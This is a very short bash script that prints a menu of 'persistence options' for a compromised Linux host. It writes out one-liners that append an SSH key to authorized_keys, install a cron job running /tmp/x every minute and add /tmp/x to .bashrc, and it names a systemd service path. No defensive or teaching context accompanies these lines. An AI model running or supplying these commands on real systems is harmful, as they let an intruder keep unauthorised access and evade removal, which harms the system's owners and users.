#!/bin/bash
echo "=== PERSISTENCE OPTIONS ==="
echo "[1] SSH: mkdir -p ~/.ssh && echo 'KEY' >> ~/.ssh/authorized_keys"
echo "[2] Cron: echo '* * * * * /tmp/x' | crontab -"
echo "[3] Bashrc: echo '/tmp/x &' >> ~/.bashrc"
echo "[4] Systemd: /etc/systemd/system/x.service"
